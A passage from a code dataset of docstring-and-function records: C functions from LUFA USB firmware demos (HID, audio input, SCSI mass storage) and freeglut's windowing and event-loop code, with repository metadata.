enumeration */\n\t\t\tif (FoundEndpoints == (1 << HID_DATA_IN_PIPE))\n\t\t\t  break;\n\t\t\t\t\n\t\t\t/* Descriptor not found, error out */\n\t\t\treturn NoEndpointFound;\n\t\t}\n\t\t\n\t\t/* Retrieve the endpoint address from the endpoint descriptor */\n\t\tUSB_Descriptor_Endpoint_t* EndpointData = DESCRIPTOR_PCAST(CurrConfigLocation, USB_Descriptor_Endpoint_t);\n\n\t\t/* If the endpoint is a IN type endpoint */\n\t\tif (EndpointData->EndpointAddress & ENDPOINT_DESCRIPTOR_DIR_IN)\n\t\t{\n\t\t\t/* Configure the HID data IN pipe */\n\t\t\tPipe_ConfigurePipe(HID_DATA_IN_PIPE, EP_TYPE_INTERRUPT, PIPE_TOKEN_IN,\n\t\t\t\t\t\t\t   EndpointData->EndpointAddress, EndpointData->EndpointSize, PIPE_BANK_SINGLE);\n\t\t\t\n\t\t\tFoundEndpoints |= (1 << HID_DATA_IN_PIPE);\n\t\t}\n\t\telse\n\t\t{\n\t\t\t/* Configure the HID data OUT pipe */\n\t\t\tPipe_ConfigurePipe(HID_DATA_OUT_PIPE, EP_TYPE_INTERRUPT, PIPE_TOKEN_OUT,\n\t\t\t\t\t\t\t   EndpointData->EndpointAddress, EndpointData->EndpointSize, PIPE_BANK_SINGLE);\n\t\t\t\n\t\t\tFoundEndpoints |= (1 << HID_DATA_OUT_PIPE);\t\t\n\t\t}\n\t}\n\t\t\t\n\t/* Valid data found, return success */\n\treturn SuccessfulConfigRead;\n}", "path": "firmware\\lufa-100513\\Demos\\Host\\LowLevel\\GenericHIDHost\\ConfigDescriptor.c", "repo_name": "humblehacker/keyboard", "stars": 34, "license": "None", "language": "c", "size": 11676}
{"docstring": "/** Processes the next audio sample by reading the last ADC conversion and writing it to the audio\n *  interface, each time the sample reload timer period elapses to give a constant sample rate.\n */\n", "func_signal": "void ProcessNextSample(void)", "code": "{\n\t/* Check if the sample reload timer period has elapsed, and that the USB bus is ready for a new sample */\n\tif ((TIFR0 & (1 << OCF0A)) && Audio_Device_IsReadyForNextSample(&Microphone_Audio_Interface))\n\t{\n\t\tTIFR0 |= (1 << OCF0A);\n\n\t\t/* Audio sample is ADC value scaled to fit the entire range */\n\t\tint16_t AudioSample = ((SAMPLE_MAX_RANGE / ADC_MAX_RANGE) * ADC_GetResult());\n\t\t\n\t\t#if defined(MICROPHONE_BIASED_TO_HALF_RAIL)\n\t\t/* Microphone is biased to half rail voltage, subtract the bias from the sample value */\n\t\tAudioSample -= (SAMPLE_MAX_RANGE / 2);\n\t\t#endif\n\n\t\tAudio_Device_WriteSample16(&Microphone_Audio_Interface, AudioSample);\n\t}\n}", "path": "firmware\\lufa-100513\\Demos\\Device\\ClassDriver\\AudioInput\\AudioInput.c", "repo_name": "humblehacker/keyboard", "stars": 34, "license": "None", "language": "c", "size": 11676}
{"docstring": "/** HID class driver callback function for the creation of HID reports to the host.\n *\n *  \\param[in] HIDInterfaceInfo  Pointer to the HID class interface configuration structure being referenced\n *  \\param[in,out] ReportID  Report ID requested by the host if non-zero, otherwise callback should set to the generated report ID\n *  \\param[in] ReportType  Type of the report to create, either REPORT_ITEM_TYPE_In or REPORT_ITEM_TYPE_Feature\n *  \\param[out] ReportData  Pointer to a buffer where the created report should be stored\n *  \\param[out] ReportSize  Number of bytes written in the report (or zero if no report is to be sent\n *\n *  \\return Boolean true to force the sending of the report, false to let the library determine if it needs to be sent\n */\n", "func_signal": "bool CALLBACK_HID_Device_CreateHIDReport(USB_ClassInfo_HID_Device_t* const HIDInterfaceInfo, uint8_t* const ReportID,\n                                         const uint8_t ReportType, void* ReportData, uint16_t* ReportSize)", "code": "{\n  USB_KeyboardReport_Data_t* KeyboardReport = (USB_KeyboardReport_Data_t*)ReportData;\n#ifndef MATRIX_DISCOVERY_MODE\n  *ReportSize = Keyboard__get_report(KeyboardReport);\n#else\n  *ReportSize = MatrixDiscovery__get_report(KeyboardReport);\n#endif\n\n  return false;\n}", "path": "firmware\\src\\Keyboard.c", "repo_name": "humblehacker/keyboard", "stars": 34, "license": "None", "language": "c", "size": 11676}
{"docstring": "/** Event handler for the library USB Disconnection event. */\n", "func_signal": "void EVENT_USB_Device_Disconnect(void)", "code": "{\n\t/* Stop the sample reload timer */\n\tTCCR0B = 0;\n\n\tLEDs_SetAllLEDs(LEDMASK_USB_NOTREADY);\n}", "path": "firmware\\lufa-100513\\Demos\\Device\\ClassDriver\\AudioInput\\AudioInput.c", "repo_name": "humblehacker/keyboard", "stars": 34, "license": "None", "language": "c", "size": 11676}
{"docstring": "/** Command processing for an issued SCSI SEND DIAGNOSTIC command. This command performs a quick check of the Dataflash ICs on the\n *  board, and indicates if they are present and functioning correctly. Only the Self-Test portion of the diagnostic command is\n *  supported.\n *\n *  \\param[in] MSInterfaceInfo  Pointer to the Mass Storage class interface structure that the command is associated with\n */\n", "func_signal": "static void SCSI_Command_Send_Diagnostic(USB_ClassInfo_MS_Device_t* const MSInterfaceInfo)", "code": "{\n\t/* Check to see if the SELF TEST bit is not set */\n\tif (!(MSInterfaceInfo->State.CommandBlock.SCSICommandData[1] & (1 << 2)))\n\t{\n\t\t/* Only self-test supported - update SENSE key and fail the command */\n\t\tSCSI_SET_SENSE(SCSI_SENSE_KEY_ILLEGAL_REQUEST,\n\t\t               SCSI_ASENSE_INVALID_FIELD_IN_CDB,\n\t\t               SCSI_ASENSEQ_NO_QUALIFIER);\n\n\t\treturn;\n\t}\n\t\n\t/* Check to see if all attached Dataflash ICs are functional */\n\tif (!(DataflashManager_CheckDataflashOperation()))\n\t{\n\t\t/* Update SENSE key with a hardware error condition and return command fail */\n\t\tSCSI_SET_SENSE(SCSI_SENSE_KEY_HARDWARE_ERROR,\n\t\t               SCSI_ASENSE_NO_ADDITIONAL_INFORMATION,\n\t\t               SCSI_ASENSEQ_NO_QUALIFIER);\t\n\t\n\t\treturn;\n\t}\n\t\n\t/* Succeed the command and update the bytes transferred counter */\n\tMSInterfaceInfo->State.CommandBlock.DataTransferLength = 0;\n}", "path": "firmware\\lufa-100513\\Projects\\Webserver\\Lib\\SCSI.c", "repo_name": "humblehacker/keyboard", "stars": 34, "license": "None", "language": "c", "size": 11676}
{"docstring": "/** Event handler for the library USB Connection event. */\n", "func_signal": "void EVENT_USB_Device_Connect(void)", "code": "{\n\tLEDs_SetAllLEDs(LEDMASK_USB_ENUMERATING);\n\n\t/* Sample reload timer initialization */\n\tOCR0A   = (F_CPU / 8 / AUDIO_SAMPLE_FREQUENCY) - 1;\n\tTCCR0A  = (1 << WGM01);  // CTC mode\n\tTCCR0B  = (1 << CS01);   // Fcpu/8 speed\n}", "path": "firmware\\lufa-100513\\Demos\\Device\\ClassDriver\\AudioInput\\AudioInput.c", "repo_name": "humblehacker/keyboard", "stars": 34, "license": "None", "language": "c", "size": 11676}
{"docstring": "/** HID class driver callback function for the processing of HID reports from the host.\n *\n *  \\param[in] HIDInterfaceInfo  Pointer to the HID class interface configuration structure being referenced\n *  \\param[in] ReportID    Report ID of the received report from the host\n *  \\param[in] ReportType  The type of report that the host has sent, either REPORT_ITEM_TYPE_Out or REPORT_ITEM_TYPE_Feature\n *  \\param[in] ReportData  Pointer to a buffer where the created report has been stored\n *  \\param[in] ReportSize  Size in bytes of the received HID report\n */\n", "func_signal": "void CALLBACK_HID_Device_ProcessHIDReport(USB_ClassInfo_HID_Device_t* const HIDInterfaceInfo, const uint8_t ReportID,\n                                          const uint8_t ReportType, const void* ReportData, const uint16_t ReportSize)", "code": "{\n  uint8_t* LEDReport = (uint8_t*)ReportData;\n\n  LEDs_ChangeLEDs(LED_CAPS_LOCK|LED_SCROLL_LOCK|LED_NUM_LOCK|\n                  LED_COMPOSE|LED_KANA, *LEDReport);\n}", "path": "firmware\\src\\Keyboard.c", "repo_name": "humblehacker/keyboard", "stars": 34, "license": "None", "language": "c", "size": 11676}
{"docstring": "/** Event handler for the library USB Configuration Changed event. */\n", "func_signal": "void EVENT_USB_Device_ConfigurationChanged(void)", "code": "{\n  LEDs_SetAllLEDs(LEDMASK_USB_READY);\n\n  if (!(HID_Device_ConfigureEndpoints(&Keyboard_HID_Interface)))\n    LEDs_SetAllLEDs(LEDMASK_USB_ERROR);\n\n  USB_Device_EnableSOFEvents();\n}", "path": "firmware\\src\\Keyboard.c", "repo_name": "humblehacker/keyboard", "stars": 34, "license": "None", "language": "c", "size": 11676}
{"docstring": "/** Command processing for an issued SCSI READ CAPACITY (10) command. This command returns information about the device's capacity\n *  on the selected Logical Unit (drive), as a number of OS-sized blocks.\n *\n *  \\param[in] MSInterfaceInfo  Pointer to the Mass Storage class interface structure that the command is associated with\n */\n", "func_signal": "static void SCSI_Command_Read_Capacity_10(USB_ClassInfo_MS_Device_t* const MSInterfaceInfo)", "code": "{\n\tuint32_t LastBlockAddressInLUN = (VIRTUAL_MEMORY_BLOCKS - 1);\n\tuint32_t MediaBlockSize        = VIRTUAL_MEMORY_BLOCK_SIZE;\n\n\tEndpoint_Write_Stream_BE(&LastBlockAddressInLUN, sizeof(LastBlockAddressInLUN), NO_STREAM_CALLBACK);\n\tEndpoint_Write_Stream_BE(&MediaBlockSize, sizeof(MediaBlockSize), NO_STREAM_CALLBACK);\n\tEndpoint_ClearIN();\n\t\n\t/* Succeed the command and update the bytes transferred counter */\n\tMSInterfaceInfo->State.CommandBlock.DataTransferLength -= 8;\n}", "path": "firmware\\lufa-100513\\Projects\\Webserver\\Lib\\SCSI.c", "repo_name": "humblehacker/keyboard", "stars": 34, "license": "None", "language": "c", "size": 11676}
{"docstring": "/** Command processing for an issued SCSI READ (10) or WRITE (10) command. This command reads in the block start address\n *  and total number of blocks to process, then calls the appropriate low-level dataflash routine to handle the actual\n *  reading and writing of the data.\n *\n *  \\param[in] MSInterfaceInfo  Pointer to the Mass Storage class interface structure that the command is associated with\n *  \\param[in] IsDataRead  Indicates if the command is a READ (10) command or WRITE (10) command (DATA_READ or DATA_WRITE)\n */\n", "func_signal": "static void SCSI_Command_ReadWrite_10(USB_ClassInfo_MS_Device_t* const MSInterfaceInfo, const bool IsDataRead)", "code": "{\n\tuint32_t BlockAddress;\n\tuint16_t TotalBlocks;\n\t\n\t/* Load in the 32-bit block address (SCSI uses big-endian, so have to reverse the byte order) */\n\tBlockAddress = SwapEndian_32(*(uint32_t*)&MSInterfaceInfo->State.CommandBlock.SCSICommandData[2]);\n\n\t/* Load in the 16-bit total blocks (SCSI uses big-endian, so have to reverse the byte order) */\n\tTotalBlocks  = SwapEndian_16(*(uint32_t*)&MSInterfaceInfo->State.CommandBlock.SCSICommandData[7]);\n\t\n\t/* Check if the block address is outside the maximum allowable value for the LUN */\n\tif (BlockAddress >= VIRTUAL_MEMORY_BLOCKS)\n\t{\n\t\t/* Block address is invalid, update SENSE key and return command fail */\n\t\tSCSI_SET_SENSE(SCSI_SENSE_KEY_ILLEGAL_REQUEST,\n\t\t               SCSI_ASENSE_LOGICAL_BLOCK_ADDRESS_OUT_OF_RANGE,\n\t\t               SCSI_ASENSEQ_NO_QUALIFIER);\n\n\t\treturn;\n\t}\n\t\n\t/* Determine if the packet is a READ (10) or WRITE (10) command, call appropriate function */\n\tif (IsDataRead == DATA_READ)\n\t  DataflashManager_ReadBlocks(MSInterfaceInfo, BlockAddress, TotalBlocks);\n\telse\n\t  DataflashManager_WriteBlocks(MSInterfaceInfo, BlockAddress, TotalBlocks);\n\n\t/* Update the bytes transferred counter and succeed the command */\n\tMSInterfaceInfo->State.CommandBlock.DataTransferLength -= ((uint32_t)TotalBlocks * VIRTUAL_MEMORY_BLOCK_SIZE);\n}", "path": "firmware\\lufa-100513\\Projects\\Webserver\\Lib\\SCSI.c", "repo_name": "humblehacker/keyboard", "stars": 34, "license": "None", "language": "c", "size": 11676}
{"docstring": "/** Descriptor comparator function. This comparator function is can be called while processing an attached USB device's\n *  configuration descriptor, to search for a specific sub descriptor. It can also be used to abort the configuration\n *  descriptor processing if an incompatible descriptor configuration is found.\n *\n *  This comparator searches for the next Interface descriptor of the correct HID Class value.\n *\n *  \\return A value from the DSEARCH_Return_ErrorCodes_t enum\n */\n", "func_signal": "uint8_t DComp_NextHIDInterface(void* CurrentDescriptor)", "code": "{\n\t/* Determine if the current descriptor is an interface descriptor */\n\tif (DESCRIPTOR_TYPE(CurrentDescriptor) == DTYPE_Interface)\n\t{\n\t\t/* Check the HID descriptor class, break out if correct class/protocol interface found */\n\t\tif (DESCRIPTOR_CAST(CurrentDescriptor, USB_Descriptor_Interface_t).Class == HID_CLASS)\n\t\t{\n\t\t\t/* Indicate that the descriptor being searched for has been found */\n\t\t\treturn DESCRIPTOR_SEARCH_Found;\n\t\t}\n\t}\n\t\n\t/* Current descriptor does not match what this comparator is looking for */\n\treturn DESCRIPTOR_SEARCH_NotFound;\n}", "path": "firmware\\lufa-100513\\Demos\\Host\\LowLevel\\GenericHIDHost\\ConfigDescriptor.c", "repo_name": "humblehacker/keyboard", "stars": 34, "license": "None", "language": "c", "size": 11676}
{"docstring": "/** This function is called by the library when in device mode, and must be overridden (see library \"USB Descriptors\"\n *  documentation) by the application code so that the address and size of a requested descriptor can be given\n *  to the USB library. When the device receives a Get Descriptor request on the control endpoint, this function\n *  is called so that the descriptor details can be passed back and the appropriate descriptor sent back to the\n *  USB host.\n */\n", "func_signal": "uint16_t CALLBACK_USB_GetDescriptor(const uint16_t wValue, const uint8_t wIndex, void** const DescriptorAddress)", "code": "{\n\tconst uint8_t  DescriptorType   = (wValue >> 8);\n\tconst uint8_t  DescriptorNumber = (wValue & 0xFF);\n\n\tvoid*    Address = NULL;\n\tuint16_t Size    = NO_DESCRIPTOR;\n\n\tswitch (DescriptorType)\n\t{\n\t\tcase DTYPE_Device:\n\t\t\tAddress = (void*)&DeviceDescriptor;\n\t\t\tSize    = sizeof(USB_Descriptor_Device_t);\n\t\t\tbreak;\n\t\tcase DTYPE_Configuration: \n\t\t\tAddress = (void*)&ConfigurationDescriptor;\n\t\t\tSize    = sizeof(USB_Descriptor_Configuration_t);\n\t\t\tbreak;\n\t\tcase DTYPE_String: \n\t\t\tswitch (DescriptorNumber)\n\t\t\t{\n\t\t\t\tcase 0x00: \n\t\t\t\t\tAddress = (void*)&LanguageString;\n\t\t\t\t\tSize    = pgm_read_byte(&LanguageString.Header.Size);\n\t\t\t\t\tbreak;\n\t\t\t\tcase 0x01: \n\t\t\t\t\tAddress = (void*)&ManufacturerString;\n\t\t\t\t\tSize    = pgm_read_byte(&ManufacturerString.Header.Size);\n\t\t\t\t\tbreak;\n\t\t\t\tcase 0x02: \n\t\t\t\t\tAddress = (void*)&ProductString;\n\t\t\t\t\tSize    = pgm_read_byte(&ProductString.Header.Size);\n\t\t\t\t\tbreak;\n\t\t\t}\n\t\t\t\n\t\t\tbreak;\n\t\tcase DTYPE_HID: \n\t\t\tAddress = (void*)&ConfigurationDescriptor.HID_GenericHID;\n\t\t\tSize    = sizeof(USB_Descriptor_HID_t);\n\t\t\tbreak;\n\t\tcase DTYPE_Report: \n\t\t\tAddress = (void*)&GenericReport;\n\t\t\tSize    = sizeof(GenericReport);\n\t\t\tbreak;\n\t}\n\t\n\t*DescriptorAddress = Address;\n\treturn Size;\n}", "path": "firmware\\lufa-100513\\Demos\\Device\\LowLevel\\GenericHID\\Descriptors.c", "repo_name": "humblehacker/keyboard", "stars": 34, "license": "None", "language": "c", "size": 11676}
{"docstring": "/*\n * Marks the current window to have the redisplay performed when possible...\n */\n", "func_signal": "void FGAPIENTRY glutPostRedisplay( void )", "code": "{\n    FREEGLUT_EXIT_IF_NOT_INITIALISED ( \"glutPostRedisplay\" );\n    if ( ! fgStructure.CurrentWindow )\n\t{\n      fgError ( \" ERROR:  Function <%s> called\"\n                \" with no current window defined.\", \"glutPostRedisplay\" ) ;\n\t}\n\n    fgStructure.CurrentWindow->State.Redisplay = GL_TRUE;\n}", "path": "src\\freeglut\\freeglut_display.c", "repo_name": "jdupuy/ssgi", "stars": 47, "license": "None", "language": "c", "size": 700}
{"docstring": "/*\n * Returns the number of GLUT ticks (milliseconds) till the next timer event.\n */\n", "func_signal": "static long fghNextTimer( void )", "code": "{\n    long ret = INT_MAX;\n    SFG_Timer *timer = fgState.Timers.First;\n\n    if( timer )\n        ret = timer->TriggerTime - fgElapsedTime();\n    if( ret < 0 )\n        ret = 0;\n\n    return ret;\n}", "path": "src\\freeglut\\freeglut_main.c", "repo_name": "jdupuy/ssgi", "stars": 47, "license": "None", "language": "c", "size": 700}
{"docstring": "/*\n * Calls a window's redraw method. This is used when\n * a redraw is forced by the incoming window messages.\n */\n", "func_signal": "static void fghRedrawWindow ( SFG_Window *window )", "code": "{\n    SFG_Window *current_window = fgStructure.CurrentWindow;\n\n    freeglut_return_if_fail( window );\n    freeglut_return_if_fail( FETCH_WCB ( *window, Display ) );\n\n    window->State.Redisplay = GL_FALSE;\n\n    freeglut_return_if_fail( window->State.Visible );\n\n    fgSetWindow( window );\n\n    if( window->State.NeedToResize )\n    {\n        fghReshapeWindow(\n            window,\n            window->State.Width,\n            window->State.Height\n        );\n\n        window->State.NeedToResize = GL_FALSE;\n    }\n\n    INVOKE_WCB( *window, Display, ( ) );\n\n    fgSetWindow( current_window );\n}", "path": "src\\freeglut\\freeglut_main.c", "repo_name": "jdupuy/ssgi", "stars": 47, "license": "None", "language": "c", "size": 700}
{"docstring": "/*\n * Indicates whether Joystick events are being used by ANY window.\n *\n * The current mechanism is to walk all of the windows and ask if\n * there is a joystick callback.  We have a short-circuit early\n * return if we find any joystick handler registered.\n *\n * The real way to do this is to make use of the glutTimer() API\n * to more cleanly re-implement the joystick API.  Then, this code\n * and all other \"joystick timer\" code can be yanked.\n *\n */\n", "func_signal": "static void fghCheckJoystickCallback( SFG_Window* w, SFG_Enumerator* e)", "code": "{\n    if( FETCH_WCB( *w, Joystick ) )\n    {\n        e->found = GL_TRUE;\n        e->data = w;\n    }\n    fgEnumSubWindows( w, fghCheckJoystickCallback, e );\n}", "path": "src\\freeglut\\freeglut_main.c", "repo_name": "jdupuy/ssgi", "stars": 47, "license": "None", "language": "c", "size": 700}
{"docstring": "/*\n * Executes a single iteration in the freeglut processing loop.\n */\n", "func_signal": "void FGAPIENTRY glutMainLoopEvent( void )", "code": "{\n#if TARGET_HOST_POSIX_X11\n    SFG_Window* window;\n    XEvent event;\n\n    /* This code was repeated constantly, so here it goes into a definition: */\n#define GETWINDOW(a)                             \\\n    window = fgWindowByHandle( event.a.window ); \\\n    if( window == NULL )                         \\\n        break;\n\n#define GETMOUSE(a)                              \\\n    window->State.MouseX = event.a.x;            \\\n    window->State.MouseY = event.a.y;\n\n    FREEGLUT_EXIT_IF_NOT_INITIALISED ( \"glutMainLoopEvent\" );\n\n    while( XPending( fgDisplay.Display ) )\n    {\n        XNextEvent( fgDisplay.Display, &event );\n#if _DEBUG\n        fghPrintEvent( &event );\n#endif\n\n        switch( event.type )\n        {\n        case ClientMessage:\n            if(fgIsSpaceballXEvent(&event)) {\n                fgSpaceballHandleXEvent(&event);\n                break;\n            }\n            /* Destroy the window when the WM_DELETE_WINDOW message arrives */\n            if( (Atom) event.xclient.data.l[ 0 ] == fgDisplay.DeleteWindow )\n            {\n                GETWINDOW( xclient );\n\n                fgDestroyWindow ( window );\n\n                if( fgState.ActionOnWindowClose == GLUT_ACTION_EXIT )\n                {\n                    fgDeinitialize( );\n                    exit( 0 );\n                }\n                else if( fgState.ActionOnWindowClose == GLUT_ACTION_GLUTMAINLOOP_RETURNS )\n                    fgState.ExecState = GLUT_EXEC_STATE_STOP;\n\n                return;\n            }\n            break;\n\n            /*\n             * CreateNotify causes a configure-event so that sub-windows are\n             * handled compatibly with GLUT.  Otherwise, your sub-windows\n             * (in freeglut only) will not get an initial reshape event,\n             * which can break things.\n             *\n             * GLUT presumably does this because it generally tries to treat\n             * sub-windows the same as windows.\n             */\n        case CreateNotify:\n        case ConfigureNotify:\n            {\n                int width, height;\n                if( event.type == CreateNotify ) {\n                    GETWINDOW( xcreatewindow );\n                    width = event.xcreatewindow.width;\n                    height = event.xcreatewindow.height;\n                } else {\n                    GETWINDOW( xconfigure );\n                    width = event.xconfigure.width;\n                    height = event.xconfigure.height;\n                }\n\n                if( ( width != window->State.OldWidth ) ||\n                    ( height != window->State.OldHeight ) )\n                {\n                    SFG_Window *current_window = fgStructure.CurrentWindow;\n\n                    window->State.OldWidth = width;\n                    window->State.OldHeight = height;\n                    if( FETCH_WCB( *window, Reshape ) )\n                        INVOKE_WCB( *window, Reshape, ( width, height ) );\n                    else\n                    {\n                        fgSetWindow( window );\n                        glViewport( 0, 0, width, height );\n                    }\n                    glutPostRedisplay( );\n                    if( window->IsMenu )\n                        fgSetWindow( current_window );\n                }\n            }\n            break;\n\n        case DestroyNotify:\n            /*\n             * This is sent to confirm the XDestroyWindow call.\n             *\n             * XXX WHY is this commented out?  Should we re-enable it?\n             */\n            /* fgAddToWindowDestroyList ( window ); */\n            break;\n\n        case Expose:\n            /*\n             * We are too dumb to process partial exposes...\n             *\n             * XXX Well, we could do it.  However, it seems to only\n             * XXX be potentially useful for single-buffered (since\n             * XXX double-buffered does not respect viewport when we\n             * XXX do a buffer-swap).\n             *\n             */\n            if( event.xexpose.count == 0 )\n            {\n                GETWINDOW( xexpose );\n                window->State.Redisplay = GL_TRUE;\n            }\n            break;\n\n        case MapNotify:\n            break;\n\n        case UnmapNotify:\n            /* We get this when iconifying a window. */ \n            GETWINDOW( xunmap );\n            INVOKE_WCB( *window, WindowStatus, ( GLUT_HIDDEN ) );\n            window->State.Visible = GL_FALSE;\n            break;\n\n        case MappingNotify:\n            /*\n             * Have the client's keyboard knowledge updated (xlib.ps,\n             * page 206, says that's a good thing to do)\n             */\n            XRefreshKeyboardMapping( (XMappingEvent *) &event );\n            break;\n\n        case VisibilityNotify:\n        {\n            /*\n             * Sending this event, the X server can notify us that the window\n             * has just acquired one of the three possible visibility states:\n             * VisibilityUnobscured, VisibilityPartiallyObscured or\n             * VisibilityFullyObscured. Note that we DO NOT receive a\n             * VisibilityNotify event when iconifying a window, we only get an\n             * UnmapNotify then.\n             */\n            GETWINDOW( xvisibility );\n            switch( event.xvisibility.state )\n            {\n            case VisibilityUnobscured:\n                INVOKE_WCB( *window, WindowStatus, ( GLUT_FULLY_RETAINED ) );\n                window->State.Visible = GL_TRUE;\n                break;\n\n            case VisibilityPartiallyObscured:\n                INVOKE_WCB( *window, WindowStatus,\n                            ( GLUT_PARTIALLY_RETAINED ) );\n                window->State.Visible = GL_TRUE;\n                break;\n\n            case VisibilityFullyObscured:\n                INVOKE_WCB( *window, WindowStatus, ( GLUT_FULLY_COVERED ) );\n                window->State.Visible = GL_FALSE;\n                break;\n\n            default:\n                fgWarning( \"Unknown X visibility state: %d\",\n                           event.xvisibility.state );\n                break;\n            }\n        }\n        break;\n\n        case EnterNotify:\n        case LeaveNotify:\n            GETWINDOW( xcrossing );\n            GETMOUSE( xcrossing );\n            if( ( event.type == LeaveNotify ) && window->IsMenu &&\n                window->ActiveMenu && window->ActiveMenu->IsActive )\n                fgUpdateMenuHighlight( window->ActiveMenu );\n\n            INVOKE_WCB( *window, Entry, ( ( EnterNotify == event.type ) ?\n                                          GLUT_ENTERED :\n                                          GLUT_LEFT ) );\n            break;\n\n        case MotionNotify:\n        {\n            GETWINDOW( xmotion );\n            GETMOUSE( xmotion );\n\n            if( window->ActiveMenu )\n            {\n                if( window == window->ActiveMenu->ParentWindow )\n                {\n                    window->ActiveMenu->Window->State.MouseX =\n                        event.xmotion.x_root - window->ActiveMenu->X;\n                    window->ActiveMenu->Window->State.MouseY =\n                        event.xmotion.y_root - window->ActiveMenu->Y;\n                }\n\n                fgUpdateMenuHighlight( window->ActiveMenu );\n\n                break;\n            }\n\n            /*\n             * XXX For more than 5 buttons, just check {event.xmotion.state},\n             * XXX rather than a host of bit-masks?  Or maybe we need to\n             * XXX track ButtonPress/ButtonRelease events in our own\n             * XXX bit-mask?\n             */\n            fgState.Modifiers = fghGetXModifiers( event.xmotion.state );\n            if ( event.xmotion.state & ( Button1Mask | Button2Mask | Button3Mask | Button4Mask | Button5Mask ) ) {\n                INVOKE_WCB( *window, Motion, ( event.xmotion.x,\n                                               event.xmotion.y ) );\n            } else {\n                INVOKE_WCB( *window, Passive, ( event.xmotion.x,\n                                                event.xmotion.y ) );\n            }\n            fgState.Modifiers = INVALID_MODIFIERS;\n        }\n        break;\n\n        case ButtonRelease:\n        case ButtonPress:\n        {\n            GLboolean pressed = GL_TRUE;\n            int button;\n\n            if( event.type == ButtonRelease )\n                pressed = GL_FALSE ;\n\n            /*\n             * A mouse button has been pressed or released. Traditionally,\n             * break if the window was found within the freeglut structures.\n             */\n            GETWINDOW( xbutton );\n            GETMOUSE( xbutton );\n\n            /*\n             * An X button (at least in XFree86) is numbered from 1.\n             * A GLUT button is numbered from 0.\n             * Old GLUT passed through buttons other than just the first\n             * three, though it only gave symbolic names and official\n             * support to the first three.\n             */\n            button = event.xbutton.button - 1;\n\n            /*\n             * Do not execute the application's mouse callback if a menu\n             * is hooked to this button.  In that case an appropriate\n             * private call should be generated.\n             */\n            if( fgCheckActiveMenu( window, button, pressed,\n                                   event.xbutton.x_root, event.xbutton.y_root ) )\n                break;\n\n            /*\n             * Check if there is a mouse or mouse wheel callback hooked to the\n             * window\n             */\n            if( ! FETCH_WCB( *window, Mouse ) &&\n                ! FETCH_WCB( *window, MouseWheel ) )\n                break;\n\n            fgState.Modifiers = fghGetXModifiers( event.xbutton.state );\n\n            /* Finally execute the mouse or mouse wheel callback */\n            if( ( button < glutDeviceGet ( GLUT_NUM_MOUSE_BUTTONS ) ) || ( ! FETCH_WCB( *window, MouseWheel ) ) )\n                INVOKE_WCB( *window, Mouse, ( button,\n                                              pressed ? GLUT_DOWN : GLUT_UP,\n                                              event.xbutton.x,\n                                              event.xbutton.y )\n                );\n            else\n            {\n                /*\n                 * Map 4 and 5 to wheel zero; EVEN to +1, ODD to -1\n                 *  \"  6 and 7 \"    \"   one; ...\n                 *\n                 * XXX This *should* be behind some variables/macros,\n                 * XXX since the order and numbering isn't certain\n                 * XXX See XFree86 configuration docs (even back in the\n                 * XXX 3.x days, and especially with 4.x).\n                 *\n                 * XXX Note that {button} has already been decremented\n                 * XXX in mapping from X button numbering to GLUT.\n\t\t\t\t *\n\t\t\t\t * XXX Should add support for partial wheel turns as Windows does -- 5/27/11\n                 */\n                int wheel_number = (button - glutDeviceGet ( GLUT_NUM_MOUSE_BUTTONS )) / 2;\n                int direction = -1;\n                if( button % 2 )\n                    direction = 1;\n\n                if( pressed )\n                    INVOKE_WCB( *window, MouseWheel, ( wheel_number,\n                                                       direction,\n                                                       event.xbutton.x,\n                                                       event.xbutton.y )\n                    );\n            }\n            fgState.Modifiers = INVALID_MODIFIERS;\n        }\n        break;\n\n        case KeyRelease:\n        case KeyPress:\n        {\n            FGCBKeyboard keyboard_cb;\n            FGCBSpecial special_cb;\n\n            GETWINDOW( xkey );\n            GETMOUSE( xkey );\n\n            /* Detect auto repeated keys, if configured globally or per-window */\n\n            if ( fgState.KeyRepeat==GLUT_KEY_REPEAT_OFF || window->State.IgnoreKeyRepeat==GL_TRUE )\n            {\n                if (event.type==KeyRelease)\n                {\n                    /*\n                     * Look at X11 keystate to detect repeat mode.\n                     * While X11 says the key is actually held down, we'll ignore KeyRelease/KeyPress pairs.\n                     */\n\n                    char keys[32];\n                    XQueryKeymap( fgDisplay.Display, keys ); /* Look at X11 keystate to detect repeat mode */\n\n                    if ( event.xkey.keycode<256 )            /* XQueryKeymap is limited to 256 keycodes    */\n                    {\n                        if ( keys[event.xkey.keycode>>3] & (1<<(event.xkey.keycode%8)) )\n                            window->State.KeyRepeating = GL_TRUE;\n                        else\n                            window->State.KeyRepeating = GL_FALSE;\n                    }\n                }\n            }\n            else\n                window->State.KeyRepeating = GL_FALSE;\n\n            /* Cease processing this event if it is auto repeated */\n\n            if (window->State.KeyRepeating)\n            {\n                if (event.type == KeyPress) window->State.KeyRepeating = GL_FALSE;\n                break;\n            }\n\n            if( event.type == KeyPress )\n            {\n                keyboard_cb = (FGCBKeyboard)( FETCH_WCB( *window, Keyboard ));\n                special_cb  = (FGCBSpecial) ( FETCH_WCB( *window, Special  ));\n            }\n            else\n            {\n                keyboard_cb = (FGCBKeyboard)( FETCH_WCB( *window, KeyboardUp ));\n                special_cb  = (FGCBSpecial) ( FETCH_WCB( *window, SpecialUp  ));\n            }\n\n            /* Is there a keyboard/special callback hooked for this window? */\n            if( keyboard_cb || special_cb )\n            {\n                XComposeStatus composeStatus;\n                char asciiCode[ 32 ];\n                KeySym keySym;\n                int len;\n\n                /* Check for the ASCII/KeySym codes associated with the event: */\n                len = XLookupString( &event.xkey, asciiCode, sizeof(asciiCode),\n                                     &keySym, &composeStatus\n                );\n\n                /* GLUT API tells us to have two separate callbacks... */\n                if( len > 0 )\n                {\n                    /* ...one for the ASCII translateable keypresses... */\n                    if( keyboard_cb )\n                    {\n                        fgSetWindow( window );\n                        fgState.Modifiers = fghGetXModifiers( event.xkey.state );\n                        keyboard_cb( asciiCode[ 0 ],\n                                     event.xkey.x, event.xkey.y\n                        );\n                        fgState.Modifiers = INVALID_MODIFIERS;\n                    }\n                }\n                else\n                {\n                    int special = -1;\n\n                    /*\n                     * ...and one for all the others, which need to be\n                     * translated to GLUT_KEY_Xs...\n                     */\n                    switch( keySym )\n                    {\n                    case XK_F1:     special = GLUT_KEY_F1;     break;\n                    case XK_F2:     special = GLUT_KEY_F2;     break;\n                    case XK_F3:     special = GLUT_KEY_F3;     break;\n                    case XK_F4:     special = GLUT_KEY_F4;     break;\n                    case XK_F5:     special = GLUT_KEY_F5;     break;\n                    case XK_F6:     special = 